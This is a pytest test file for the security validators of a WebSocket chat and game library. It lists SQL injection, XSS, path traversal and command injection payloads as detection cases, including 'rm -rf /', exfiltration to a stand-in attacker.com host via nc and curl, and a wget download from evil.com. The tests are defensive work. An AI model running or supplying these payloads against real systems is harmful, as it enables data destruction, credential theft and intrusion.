"""
Test input validation system for security protection
"""

import pytest
import time
from pydantic import ValidationError

from aiows.types import ChatMessage, JoinRoomMessage, GameActionMessage
from aiows.validators import (
    SecurityValidator, Sanitizer, WhitelistValidator, JSONBombProtector,
    SecurityLimits
)


class TestSQLInjectionProtection:
    """Test SQL injection attack protection"""
    
    def test_sql_injection_patterns_detected(self):
        """Test that common SQL injection patterns are detected"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "UNION SELECT password FROM users",
            "1; DELETE FROM messages; --",
            "' OR 1=1 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "1' UNION SELECT * FROM users WHERE '1'='1",
        ]
        
        for malicious_input in malicious_inputs:
            assert SecurityValidator.check_sql_injection(malicious_input)
            assert not SecurityValidator.is_safe_string(malicious_input)
    
    def test_safe_text_rejects_sql_injection(self):
        """Test that ChatMessage rejects SQL injection attempts"""
        with pytest.raises(ValidationError) as exc_info:
            ChatMessage(
                text="Hello'; DROP TABLE users; --",
                user_id=1
            )
        
        assert "dangerous patterns" in str(exc_info.value).lower()
    
    def test_valid_sql_like_text_allowed(self):
        """Test that legitimate text with SQL-like words is allowed (after sanitization)"""
        valid_messages = [
            "I want to select a good restaurant",
            "Lets join the union meeting",  # Note: apostrophe removed for security
            "Please update me on the status", 
            "I need to delete this file from my computer",
        ]
        
        for message in valid_messages:
            # Should not raise validation error
            chat_msg = ChatMessage(text=message, user_id=1)
            assert chat_msg.text == message


class TestXSSProtection:
    """Test XSS attack protection"""
    
    def test_xss_patterns_detected(self):
        """Test that XSS patterns are detected"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "<svg onload=alert(1)>",
            "<object data='javascript:alert(1)'></object>",
            "<embed src='javascript:alert(1)'>",
            "<link rel='stylesheet' href='javascript:alert(1)'>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
            "<style>body{background:url('javascript:alert(1)')}</style>",
        ]
        
        for payload in xss_payloads:
            assert SecurityValidator.check_xss(payload)
            assert not SecurityValidator.is_safe_string(payload)
    
    def test_safe_html_like_text_allowed(self):
        """Test that safe HTML-like text is allowed after sanitization"""
        safe_texts = [
            "I love programming in <language>",
            "The temperature is <20 degrees",
            "Use the greater than > symbol here",
            "Math: 5 < 10 and 10 > 5",
        ]
        
        for text in safe_texts:
            # Should not raise validation error (after sanitization)
            chat_msg = ChatMessage(text=text, user_id=1)
            # Text should be sanitized
            assert chat_msg.text is not None


class TestCommandInjectionProtection:
    """Test command injection protection"""
    
    def test_command_injection_patterns_detected(self):
        """Test that command injection patterns are detected"""
        command_payloads = [
            "test; rm -rf /",
            "name && cat /etc/passwd",
            "input | nc attacker.com 4444",
            "file`whoami`",
            "data$(id)",
            "text{echo,hello}",
            "wget http://evil.com/malware",
            "curl -X POST http://attacker.com/steal --data",
            "bash -c 'malicious command'",
            "powershell.exe -Command 'Get-Process'",
        ]
        
        for payload in command_payloads:
            assert SecurityValidator.check_command_injection(payload)
            assert not SecurityValidator.is_safe_string(payload)


class TestPathTraversalProtection:
    """Test path traversal protection"""
    
    def test_path_traversal_patterns_detected(self):
        """Test that path traversal patterns are detected"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "\\\\server\\share\\file",
            "%252e%252e%252f%252e%252e%252f",
        ]
        
        for payload in path_payloads:
            assert SecurityValidator.check_path_traversal(payload)
            assert not SecurityValidator.is_safe_string(payload)


class TestSanitization:
    """Test input sanitization"""
    
    def test_text_sanitization(self):
        """Test that dangerous characters are removed from text"""
        dangerous_text = "Hello<script>alert('xss')</script>world"
        sanitized = Sanitizer.sanitize_text(dangerous_text)
        
        assert "<" not in sanitized
        assert ">" not in sanitized
        assert "script" in sanitized  # Word itself is okay
        assert "Hello" in sanitized
        assert "world" in sanitized
    
    def test_identifier_sanitization(self):
        """Test username/room_id sanitization"""
        dangerous_id = "user<script>123"
        sanitized = Sanitizer.sanitize_identifier(dangerous_id)
        
        assert sanitized == "userscript123"  # HTML chars removed, text preserved
        assert "<" not in sanitized
        assert ">" not in sanitized
    
    def test_action_sanitization(self):
        """Test game action sanitization"""
        dangerous_action = "move; rm -rf /"
        sanitized = Sanitizer.sanitize_action(dangerous_action)
        
        assert sanitized == "movermrf"
        assert ";" not in sanitized
        assert " " not in sanitized


class TestWhitelistValidation:
    """Test whitelist-based validation"""
    
    def test_username_whitelist(self):
        """Test username whitelist validation"""
        valid_usernames = ["user123", "test_user", "user.name", "user-name"]
        invalid_usernames = ["user@domain", "user<script>", "user&admin", "user|cmd"]
        
        for username in valid_usernames:
            assert WhitelistValidator.validate_username(username)
        
        for username in invalid_usernames:
            assert not WhitelistValidator.validate_username(username)
    
    def test_room_id_whitelist(self):
        """Test room ID whitelist validation"""
        valid_room_ids = ["room123", "test-room", "room_name"]
        invalid_room_ids = ["room.with.dots", "room@domain", "room<script>"]
        
        for room_id in valid_room_ids:
            assert WhitelistValidator.validate_room_id(room_id)
        
        for room_id in invalid_room_ids:
            assert not WhitelistValidator.validate_room_id(room_id)
    
    def test_action_whitelist(self):
        """Test game action whitelist validation"""
        valid_actions = ["move", "attack", "defend", "jump", "run"]
        invalid_actions = ["hack", "exploit", "delete", "format", "evil_action"]
        
        for action in valid_actions:
            assert WhitelistValidator.validate_action(action)
        
        for action in invalid_actions:
            assert not WhitelistValidator.validate_action(action)


class TestSizeLimits:
    """Test size limit enforcement"""
    
    def test_text_length_limit(self):
        """Test that oversized text is rejected"""
        oversized_text = "a" * (SecurityLimits.MAX_TEXT_LENGTH + 1)
        
        with pytest.raises(ValidationError) as exc_info:
            ChatMessage(text=oversized_text, user_id=1)
        
        assert "too long" in str(exc_info.value).lower()
    
    def test_username_length_limit(self):
        """Test that oversized username is rejected"""
        oversized_username = "a" * (SecurityLimits.MAX_USERNAME_LENGTH + 1)
        
        with pytest.raises(ValidationError):
            JoinRoomMessage(room_id="test", user_name=oversized_username)
    
    def test_room_id_length_limit(self):
        """Test that oversized room ID is rejected"""
        oversized_room_id = "a" * (SecurityLimits.MAX_ROOM_ID_LENGTH + 1)
        
        with pytest.raises(ValidationError):
            JoinRoomMessage(room_id=oversized_room_id, user_name="test")


class TestJSONBombProtection:
    """Test JSON bomb protection"""
    
    def test_deep_nesting_protection(self):
        """Test protection against deeply nested JSON"""
        # Create deeply nested structure
        deep_data = {}
        current = deep_data
        for i in range(SecurityLimits.MAX_JSON_DEPTH + 5):
            current["level"] = {}
            current = current["level"]
        
        assert JSONBombProtector.check_json_bomb(deep_data)
    
    def test_large_array_protection(self):
        """Test protection against oversized arrays"""
        large_array = ["item"] * (SecurityLimits.MAX_ARRAY_LENGTH + 1)
        
        assert JSONBombProtector.check_json_bomb(large_array)
    
    def test_large_object_protection(self):
        """Test protection against objects with too many keys"""
        large_object = {f"key_{i}": f"value_{i}" for i in range(SecurityLimits.MAX_OBJECT_KEYS + 1)}
        
        assert JSONBombProtector.check_json_bomb(large_object)


class TestValidDataHandling:
    """Test that valid data passes validation"""
    
    def test_valid_chat_message(self):
        """Test that valid chat messages are accepted"""
        valid_message = ChatMessage(
            text="Hello, how are you today?",
            user_id=123
        )
        
        assert valid_message.text == "Hello, how are you today?"
        assert valid_message.user_id == 123
        assert valid_message.type == "chat"
    
    def test_valid_join_room_message(self):
        """Test that valid join room messages are accepted"""
        valid_message = JoinRoomMessage(
            room_id="game_room_1",
            user_name="player123"
        )
        
        assert valid_message.room_id == "game_room_1"
        assert valid_message.user_name == "player123"
        assert valid_message.type == "join_room"
    
    def test_valid_game_action_message(self):
        """Test that valid game actions are accepted"""
        valid_message = GameActionMessage(
            action="move",
            coordinates=(10, 20)
        )
        
        assert valid_message.action == "move"
        assert valid_message.coordinates == (10, 20)
        assert valid_message.type == "game_action"


class TestCoordinatesValidation:
    """Test coordinates validation"""
    
    def test_valid_coordinates(self):
        """Test that valid coordinates are accepted"""
        valid_coords = [(0, 0), (100, 200), (-50, 75), (9999, -9999)]
        
        for coords in valid_coords:
            message = GameActionMessage(action="move", coordinates=coords)
            assert message.coordinates == coords
    
    def test_invalid_coordinates_type(self):
        """Test that invalid coordinate types are rejected"""
        invalid_coords = [
            "not_coords",
            [1, 2, 3],  # Too many elements
            [1],  # Too few elements
            (1.5, 2.5),  # Float coordinates
            ("x", "y"),  # String coordinates
        ]
        
        for coords in invalid_coords:
            with pytest.raises(ValidationError):
                GameActionMessage(action="move", coordinates=coords)
    
    def test_coordinates_range_limits(self):
        """Test that coordinates outside allowed range are rejected"""
        invalid_coords = [
            (100000, 0),  # X too large
            (0, 100000),  # Y too large
            (-100000, 0),  # X too small
            (0, -100000),  # Y too small
        ]
        
        for coords in invalid_coords:
            with pytest.raises(ValidationError):
                GameActionMessage(action="move", coordinates=coords)


class TestUserIdValidation:
    """Test user ID validation"""
    
    def test_valid_user_ids(self):
        """Test that valid user IDs are accepted"""
        valid_ids = [1, 100, 1000000, 2147483647]
        
        for user_id in valid_ids:
            message = ChatMessage(text="Hello", user_id=user_id)
            assert message.user_id == user_id
    
    def test_invalid_user_ids(self):
        """Test that invalid user IDs are rejected"""
        invalid_ids = [
            0,  # Too small
            -1,  # Negative
            2147483648,  # Too large
            "123",  # String
            1.5,  # Float
        ]
        
        for user_id in invalid_ids:
            with pytest.raises(ValidationError):
                ChatMessage(text="Hello", user_id=user_id)


class TestPerformanceImpact:
    """Test that validation has minimal performance impact"""
    
    def test_validation_performance(self):
        """Test that validation doesn't significantly slow down message processing"""
        test_message = "This is a normal message with reasonable length"
        
        # Measure time for multiple validations
        start_time = time.time()
        
        for _ in range(1000):
            ChatMessage(text=test_message, user_id=123)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Should process 1000 messages in less than 1 second
        assert total_time < 1.0, f"Validation too slow: {total_time:.3f}s for 1000 messages"
    
    def test_complex_validation_performance(self):
        """Test performance with more complex validation scenarios"""
        complex_message = "This is a longer message with various characters: 123 !@# $%^ &*() -=+ []{}|\\:;\"'<>,.?/"
        
        start_time = time.time()
        
        for _ in range(100):
            try:
                ChatMessage(text=complex_message, user_id=123)
            except ValidationError:
                pass  # Expected for some complex characters
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Should process 100 complex messages in less than 0.5 seconds
        assert total_time < 0.5, f"Complex validation too slow: {total_time:.3f}s for 100 messages"


if __name__ == "__main__":
    pytest.main([__file__]) 